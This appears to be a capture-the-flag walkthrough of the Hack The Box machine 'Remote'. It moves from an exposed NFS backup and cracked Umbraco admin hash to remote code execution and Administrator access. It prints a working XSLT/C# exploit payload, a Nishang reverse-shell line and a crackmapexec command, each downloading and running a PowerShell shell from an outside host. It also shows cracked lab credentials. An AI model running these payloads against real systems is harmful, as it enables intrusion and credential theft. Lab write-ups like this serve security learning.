# Remote

We find a network file system
![[Pasted image 20220713093249.png]]

Make a directory for it

```
mkdir site_backups
```

and mount it

```
sudo mount -t nfs 
```

There are a bunch of files. These appear to be the backup files for umbro CMS.

![[Pasted image 20220713093325.png]]

We find some interesting content in App_data/Umbraco.sdf

```
strings Umbraco.sdf | head -n 20
```

```
Administratoradmindefaulten-US                                                                                 
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d                                             
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

We have the following username/hash combos

```
admin:b8be16afba8c314ad33d812f22a04991b90e2aaa (SHA1)
smith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256)
ssmith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256)

```

We're able to crack admin's hash using crackstation
![[Pasted image 20220713101041.png]]

`admin:baconandcheese`

We can now log in, but need to use the admin's email: `admin@htb.local`

Now we can use EDB-49488 which grants RCE through Umbraco with credentials.

```
python3 49488.py -u admin@htb.local -p baconandcheese -i http://remote:80/ -c whoami
```

![[Pasted image 20220713102533.png]]

This exploit seemed limited, so I switched to a similar exploit EDB-46153

We had to make a few changes to the exploit, those are highlighted in yellow. This payload will ping our machine, we watch with Wireshark to verify RCE

![[Pasted image 20220713104157.png]]

It works!

![[Pasted image 20220713104248.png]]

Then use inmemory injection to run a Powershell reverse shell.

We use this powershell script: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

with this line added at the end

```
Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444
```

and name the file `shell.ps1`

Now update our exploit payload, a few notes:
- I was getting errors and felt like it was related to the quotes so I surrounded teh whole payload in trip quotes `"""`
```xml
payload = """<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> """;

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180:80";

```

this gives us a shell. We see the user has SeImpersonatePrivilege Enabled.

![[Pasted image 20220713120713.png]]
and the only other user worth going after is `Administrator`

![[Pasted image 20220713120800.png]]

We can use `post/windows/gather/credentials/teamviewer_passwords` in metasploit, but it requires a valid meterpreter session.
![[Pasted image 20220713121652.png]]

Lets generate a meterpreter payload, copy it over, and get a session up.

Now we run the command and get a password

![[Pasted image 20220713122134.png]]

lets try that as Administrator's password:

It works, AAND we can use smb to get a shell.

![[Pasted image 20220713122302.png]]

We'll specify the same powershell command we used earlier to get a shell.

```
crackmapexec smb 10.10.10.180 -u Administrator -p '!R3m0te!' -X "IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')"
```

It worked!

![[Pasted image 20220713122535.png]]

